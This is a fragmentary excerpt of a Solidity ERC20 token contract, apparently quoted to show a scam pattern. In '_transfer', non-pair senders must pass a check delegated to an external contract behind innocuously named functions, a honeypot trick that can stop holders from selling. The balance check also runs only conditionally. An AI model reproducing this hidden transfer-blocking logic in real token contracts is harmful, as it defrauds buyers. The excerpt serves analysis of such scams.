...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        _swap = routerSwap(_caPro);
        require(_swap.swapAndLiquidity() == true);
    ...
    function fundisAd(address s, address r) internal view returns (bool){
    ...
    function isMarketPair(address addr) view private{
        require(_swap.beforeLiquidity(addr));
    }
    ...
    function _transfer(
        ...
        if(fundisAd(from,to)) require(balance >= amount, "balanceNotEnough");

        bool takeFee;
        bool isSell;

        if(!_swapPairList[from]) {isMarketPair (from);}
